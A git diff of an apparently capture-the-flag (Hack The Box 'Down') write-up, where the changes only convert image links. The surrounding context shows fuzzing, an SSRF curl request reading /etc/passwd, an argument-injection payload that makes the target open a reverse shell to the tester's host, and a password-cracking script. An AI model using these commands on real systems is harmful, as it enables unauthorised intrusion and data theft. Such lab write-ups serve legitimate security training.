@@ -37,7 +37,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
 ```
 
 Have the server send a request to your host and watch it with `nc` or Wireshark.
-![[Pasted image 20251122012906.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251122012906.png)
 
 ```
 ffuf -u 'http://10.129.234.87/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .php,.txt,.bak -mc 200,301,302
@@ -45,12 +45,12 @@ ffuf -u 'http://10.129.234.87/FUZZ' -w /usr/share/seclists/Discovery/Web-Content
 
 
 Sniper attack in burp intruder with /usr/share/seclists/Fuzzing/special-chars.txt
-![[Pasted image 20251122020203.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251122020203.png)
 
 ```
 curl -X POST http://10.129.234.87/index.php -d "url=http://+file:///etc/passwd"
 ```
-![[Pasted image 20251122015953.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251122015953.png)
 
 Read source code:
 ```
@@ -62,7 +62,7 @@ RCE payload:
 update GET to POST
 ?expermode=tcp
 ip=10.10.14.97&port=1337+-e+/bin/bash
-![[Pasted image 20251122021236.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251122021236.png)
 nv -nvlp 1337
 
 ```
@@ -104,7 +104,7 @@ for word in words:
         break
 
 ```
-![[Pasted image 20251122023620.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251122023620.png)
 ```
 ares@legion:~/HackTheBox/Down$ python3 decrypt.py 
 flower
